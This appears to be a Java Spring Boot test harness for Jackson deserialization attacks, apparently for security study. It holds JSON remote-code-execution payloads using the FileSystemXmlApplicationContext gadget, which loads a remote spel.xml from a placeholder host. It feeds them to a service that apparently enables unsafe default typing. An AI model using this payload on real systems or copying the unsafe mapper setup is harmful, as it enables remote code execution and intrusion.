package com.pradeep.deserializetester;
import com.pradeep.deserializetester.Service.HackerService;
import com.fasterxml.jackson.databind.ObjectMapper;
import com.pradeep.deserializetester.Model.Hacker;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.boot.SpringApplication;
import org.springframework.boot.autoconfigure.SpringBootApplication;

import java.io.IOException;


@SpringBootApplication
public class JacksonTesterApplication {

	public static void main(String[] args) throws IOException {
		System.out.println("[-] JACKSON DESERIALIZATION TESTER - SickurityWizard\n");

		//RUN LOCALLY
		HackerService hackerService = new HackerService();
		String jsonRCEPayload = "{\"name\":[\"org.springframework.context.support.FileSystemXmlApplicationContext\", \"http://x.x.x.x:8000/spel.xml\"],\"age\":123}";
        String jsonRCEPayloadObject = "[\"org.springframework.context.support.FileSystemXmlApplicationContext\", \"http://x.x.x.x:8000/spel.xml\"]";

		hackerService.deserialize_EnableDefaultMapper(jsonRCEPayload);
//		hackerService.deserialize_EnableDefaultMapper_ObjectClass(jsonRCEPayloadObject);
//		hackerService.deserialize_JsonTypeIDClass(jsonRCEPayload);

//		SpringApplication.run(JacksonTesterApplication.class, args);

	}
}